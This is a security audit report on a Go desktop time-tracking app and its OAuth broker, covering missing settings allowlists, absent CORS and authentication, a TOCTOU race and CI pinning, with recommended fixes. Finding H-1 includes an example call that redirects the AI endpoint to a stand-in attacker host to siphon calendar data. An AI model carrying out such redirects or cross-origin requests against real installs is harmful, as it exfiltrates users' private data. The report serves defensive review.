# Security Audit Report — 2026-07-23

**Scope:** `/workspace` — race conditions, logic bypasses, infra/config, secrets, dependencies, Connect RPC.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 2 |
| Medium   | 5 |
| Low      | 5 |
| Info     | 3 |

Overall the codebase is well-structured. SQLite operations use transactions appropriately, OAuth flows use proper PKCE and state binding, and the broker employs AES-GCM sealed payloads with AAD. The findings below identify real issues that should be addressed, ordered by severity.

---

## HIGH Findings

### H-1: Unrestricted Settings Keys — Arbitrary Write to Any App Setting

**File:** `internal/api/appapi/settings_integration_export.go:30-38`  
**File:** `internal/service/service.go:464-469`

```go
func (s *SettingsService) SetSetting(ctx context.Context, req *connect.Request[appv1.SetSettingRequest]) (*connect.Response[appv1.SetSettingResponse], error) {
    if req.Msg.Key == "" {
        return nil, invalidArgument("key is required")
    }
    if err := s.service.SetSetting(ctx, req.Msg.Key, req.Msg.Value); err != nil {
        return nil, mapServiceError(err)
    }
    return connect.NewResponse(&appv1.SetSettingResponse{}), nil
}
```

**Issue:** `SetSetting` accepts any key string with no allowlist validation. A caller can write to any settings key, including internal-only keys like `period.cadence`, `ai.base_url`, `ai.model`, `ai.max_tokens`, and `ai.privacy`.

**Attack chain:**
1. Call `SetSetting(key="ai.base_url", value="\"https://attacker.com/v1\"")`.
2. All subsequent AI gap-fill suggestions are routed to an attacker-controlled endpoint.
3. The attacker receives the user's calendar event titles, descriptions, and schedule data.

**Impact:** Data exfiltration via AI proxy redirect. Also enables manipulation of period cadence, AI model selection, and privacy settings.

**Recommendation:** Implement a strict allowlist of user-settable keys. Reject writes to any key not on the list.

---

### H-2: No Authentication/Authorization on Connect RPC Handlers

**File:** `internal/api/appapi/handler.go:31-63`

```go
func NewHandler(deps Dependencies) http.Handler {
    mux := http.NewServeMux()
    mount := func(path string, handler http.Handler) { mux.Handle(path, handler) }
    path, handler := appv1connect.NewPeriodServiceHandler(NewPeriodService(deps.Service))
    mount(path, handler)
    // ... all services mounted with no interceptors/middleware
    return mux
}
```

**Issue:** No Connect interceptors, no authentication middleware, no CORS policy. All RPC handlers are mounted on a bare `http.ServeMux` with zero access control.

**Context:** This is a desktop app where the frontend and backend are co-located via Wails' AssetServer (same-origin). The attack surface is limited to local network unless a browser is tricked into making cross-origin requests.

**Attack chain:**
1. User visits a malicious website.
2. The site makes `POST` requests to `http://localhost:<wails-port>/shiet.app.v1.ScheduleService/DeleteTimeEntry` with a crafted protobuf/JSON body.
3. Without CORS restrictions, the browser sends the request and the backend executes it, deleting time entries.

**Impact:** Any local process or a CSRF via browser can read/modify all user data — time entries, categories, projects, settings, calendar connections.

**Recommendation:**
- Add CORS middleware restricting `Origin` to the Wails frontend origin.
- Consider adding a session token or `X-Wails-Request` header check as a secondary defense.

---

## MEDIUM Findings

### M-1: Time Entry Updates Bypass Attestation Check — Confirmed Entries Are Editable

**File:** `internal/service/time_entry.go:93-133`

```go
func (s *Service) UpdateTimeEntry(ctx context.Context, input TimeEntryUpdateInput) (TimeEntry, error) {
    // No attestation check — proceeds directly to update
    span, err := s.timeEntrySpan(ctx, "update time entry", input.TimeEntryInput)
    // ...
    row, err := s.q.UpdateTimeEntry(ctx, sqlc.UpdateTimeEntryParams{...})
}
```

**Contrast with** `AdjustDraftTimeEntry` (line 417-434) which correctly validates `row.Attestation != "draft"`.

**Issue:** `UpdateTimeEntry` does not verify that the entry is still a draft. A confirmed (attested) time entry — one that has already been locked in — can be silently modified through the `UpdateTimeEntry` RPC. The API handler at `schedule.go:94-106` calls `UpdateTimeEntry` directly.

**Attack chain:**
1. User confirms a time entry (attestation = "confirmed").
2. Call `UpdateTimeEntry` with the same ID and modified start/end minutes.
3. The confirmed entry is silently changed.

**Impact:** Integrity bypass of the confirmation workflow. Confirmed time entries should be immutable (the entire review/confirm flow depends on this invariant).

**Recommendation:** Add an attestation check in `UpdateTimeEntry` or in the API handler, rejecting updates to non-draft entries.

---

### M-2: ResolveReviewDecision Accepts Arbitrary Action Strings Without Validation at API Layer

**File:** `internal/api/appapi/schedule.go:261-270`

```go
func (s *ScheduleService) ResolveReviewDecision(ctx context.Context, req *connect.Request[appv1.ResolveReviewDecisionRequest]) (*connect.Response[appv1.ResolveReviewDecisionResponse], error) {
    if err := requireID(req.Msg.DecisionId, "decision_id"); err != nil {
        return nil, err
    }
    result, err := s.service.ResolveReviewDecision(ctx, service.ResolveReviewDecisionInput{
        DecisionID: req.Msg.DecisionId,
        Action:     req.Msg.Action,  // No validation of action string
    })
```

**Issue:** The `Action` field is passed directly from the client to the service layer without any validation at the API boundary. While the service layer's `reviewPolicy.Apply` does validate action/kind combinations and returns errors for invalid actions, the API layer should enforce an allowlist.

**Impact:** Reduces defense-in-depth. The service layer catches this today, but if new review kinds are added that don't validate exhaustively, the action string becomes an injection vector.

**Recommendation:** Add `req.Msg.Action` validation against the known action constants at the API layer.

---

### M-3: Metrics Endpoint Disabled When Token Is Empty — No Default Protection

**File:** `internal/broker/httpapi/server.go:139-149`

```go
func metricsAuthorized(r *http.Request, token string) bool {
    if token == "" {
        return false
    }
    // ...
}
```

**File:** `internal/broker/config/config.go:84`

```go
MetricsToken: os.Getenv("SHIET_BROKER_METRICS_TOKEN"),
```

**Issue:** When `SHIET_BROKER_METRICS_TOKEN` is unset (common in quick deployments), the `/metrics` endpoint returns 404 for all requests. This is safe but means operators get no observability unless they explicitly configure the token.

However, if `Validate()` doesn't enforce the token is set, a deployment misconfiguration could leave the metrics endpoint silently unavailable while the operator assumes it's working.

**Impact:** Low operational risk — no data exposure, but observability gap.

**Recommendation:** Document the `SHIET_BROKER_METRICS_TOKEN` requirement prominently. Consider logging a warning at startup when the metrics token is empty.

---

### M-4: SQLite Busy Timeout May Be Insufficient for Concurrent Desktop + Sync Operations

**File:** `internal/db/db.go:25-26`

```go
dsn := fmt.Sprintf(
    "file:%s?_pragma=busy_timeout(5000)&...",
    path,
)
```

**Issue:** The 5-second busy timeout is reasonable for a single-user desktop app, but during calendar sync (which runs a large transaction in `SyncEvents`) concurrent reads/writes from the UI will block and may timeout. SQLite WAL mode mitigates this for reads but writes still serialize.

**Potential scenario:**
1. User triggers `SyncPeriod` which calls `SyncEvents` with a large transaction.
2. Simultaneously, user creates/updates time entries.
3. The time entry write hits the 5-second busy timeout and fails.

**Impact:** Data loss is unlikely (the operation returns an error), but the UX is poor and the user loses their in-progress edit.

**Recommendation:** Consider increasing to 10s or implementing retry-with-backoff at the service layer for write operations.

---

### M-5: DeleteCategory Race with categoryInUse Check

**File:** `internal/service/category.go:164-182`

```go
func (s *Service) DeleteCategory(ctx context.Context, id int64) error {
    current, err := s.q.GetCategory(ctx, id)
    // ...
    inUse, err := s.categoryInUse(ctx, id)
    if inUse {
        return fmt.Errorf("delete category: %w", ErrCategoryInUse)
    }
    if err := s.q.DeleteCategory(ctx, id); err != nil {
        return mapErr("delete category", err)
    }
    return nil
}
```

**Issue:** `categoryInUse` check and `DeleteCategory` are not wrapped in a transaction. Between the check and the delete, a concurrent operation could create a reference to this category (e.g., a sync adding an overlay). This is a classic TOCTOU.

**Impact:** In a single-user desktop app the window is very small, but if a calendar sync is running concurrently, it could create a dangling reference. SQLite foreign key constraints (enabled in the DSN) would catch this and return an error, so data corruption is prevented, but the error handling path is ungraceful.

**Recommendation:** Wrap the check-and-delete in a single transaction.

---

## LOW Findings

### L-1: Broker Dockerfile Uses Distroless — Good, But No Health User

**File:** `deploy/railway/oauth-broker.Dockerfile:35-38`

```dockerfile
FROM gcr.io/distroless/static-debian12
COPY --from=build /out/oauth-broker /oauth-broker
ENTRYPOINT ["/oauth-broker"]
```

**Finding:** The final image uses `distroless/static` which runs as root (UID 0) by default. Distroless images have no shell or package manager, so the blast radius is limited, but running as non-root is a best practice.

**Recommendation:** Add `USER 65534` (nobody) after the `COPY`.

---

### L-2: CI Workflow Does Not Pin Action SHAs

**File:** `.github/workflows/ci.yml`

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-go@v5
- uses: bufbuild/buf-setup-action@v1
- uses: pnpm/action-setup@v4
```

**Issue:** All GitHub Actions are pinned to major version tags (e.g., `@v4`) rather than full commit SHAs. A compromised upstream action could inject malicious code into the CI pipeline.

**Impact:** Supply chain risk. An attacker who compromises an action repo could exfiltrate secrets or inject code.

**Recommendation:** Pin actions to full commit SHAs (e.g., `actions/checkout@<sha>`).

---

### L-3: Error Messages Leak Internal Detail to Client

**File:** `internal/service/time_entry.go:166-190` (and throughout service layer)

```go
return timeEntrySpan{}, invalidInputf("%s: day %s is outside period %s to %s", action, input.Day, period.StartDate, period.EndDate)
```

**File:** `internal/api/appapi/period.go:92-116` (`mapServiceError`)

```go
case errors.Is(err, service.ErrInvalidInput):
    return connect.NewError(connect.CodeInvalidArgument, errors.New("request is invalid"))
```

**Finding:** The `mapServiceError` function correctly strips detailed messages for most errors. However, raw error strings from `ErrInvalidInput` and `ErrFailedPrecondition` are wrapped generically. This is acceptable. No sensitive data is leaked.

**Impact:** Minimal — internal period dates are not sensitive in a single-user desktop app.

---

### L-4: No Request Size Limits on Connect RPC Handlers

**File:** `internal/api/appapi/handler.go`

**Issue:** The Connect handlers are mounted without any request body size limits. While the broker's JSON endpoints correctly use `io.LimitReader(body, 1<<20)` (1 MB), the Connect/protobuf handlers rely on the default `http.MaxBytesReader` behavior (none set).

**Impact:** A malicious local process could send very large requests to cause memory pressure. In practice, Wails' AssetServer may impose its own limits.

**Recommendation:** Add a `connect.WithMaxReceiveMessageSize()` interceptor.

---

### L-5: `EnsureCurrentPeriod` Can Create Unbounded Periods

**File:** `internal/service/period.go:15-74`

**Issue:** `EnsureCurrentPeriod` creates a new period if none exists for the given `today` date. There is no limit on how many periods can be created. An attacker could call this repeatedly with different dates to create hundreds of periods.

**Impact:** Database bloat. No data integrity risk.

**Recommendation:** Add a sanity check on the total number of periods or the date range.

---

## INFO Findings

### I-1: No Hardcoded Secrets Found

All credential-like strings found in search results are in `_test.go` files using obvious test values (`"xoxp-test"`, `"client-secret"`, `"ghp_test"`). No `.env` files exist in the repository. The `config.example.yaml` contains only empty strings for credentials. The broker reads all secrets from environment variables.

**Status:** Clean.

---

### I-2: Dependency Versions Are Current

| Package | Version | Status |
|---------|---------|--------|
| `connectrpc.com/connect` | v1.20.0 | Current |
| `golang.org/x/oauth2` | v0.36.0 | Current |
| `golang.org/x/crypto` | v0.50.0 | Current |
| `modernc.org/sqlite` | v1.52.0 | Current |
| `google.golang.org/protobuf` | v1.36.11 | Current |
| `github.com/pressly/goose/v3` | v3.27.1 | Current |
| `react` | ^18.3.1 | Current (18.x line) |
| `vite` | ^5.4.11 | Current |
| `@connectrpc/connect` | 2.1.2 | Current |

No known CVEs identified for the pinned versions. The `go.sum` provides integrity verification.

---

### I-3: Broker OAuth Security Model Is Sound

The broker implements several defense-in-depth measures:
- **PKCE S256** for all OAuth flows (both local and broker).
- **Single-use state tokens** with expiration and transactional consumption (`ConsumeOAuthState` uses `WHERE used_at IS NULL` with row count verification).
- **AES-256-GCM encryption** of token payloads with AAD binding (state ID + session ID + handoff challenge).
- **Handoff code hashing** — only the SHA-256 hash is stored; the plaintext code is ephemeral.
- **Rate limiting** on all broker surfaces (start, callback, handoff, refresh, revoke) with per-IP bucketing.
- **App version kill switch** for disabling compromised client versions.
- **Desktop handoff redirect validation** — restricted to `http://127.0.0.1` with no query/fragment.
- **Credential scrubbing** — broker mode clears client_id/client_secret from runtime config.

The `ConsumeOAuthState` and `ConsumeHandoff` operations use database transactions with `used_at IS NULL` guards and `RowsAffected` verification, preventing replay attacks even under concurrent access.

---

## Recommendations Priority

1. **H-1** (Settings allowlist) — Implement immediately; enables data exfiltration via AI proxy.
2. **H-2** (CORS/auth on Connect handlers) — Implement CORS restrictions at minimum.
3. **M-1** (UpdateTimeEntry attestation check) — Enforce confirmed entry immutability.
4. **M-5** (DeleteCategory TOCTOU) — Wrap in transaction.
5. **L-1** (Dockerfile non-root) — One-line fix.
6. **L-2** (Pin action SHAs) — One-time CI hardening.
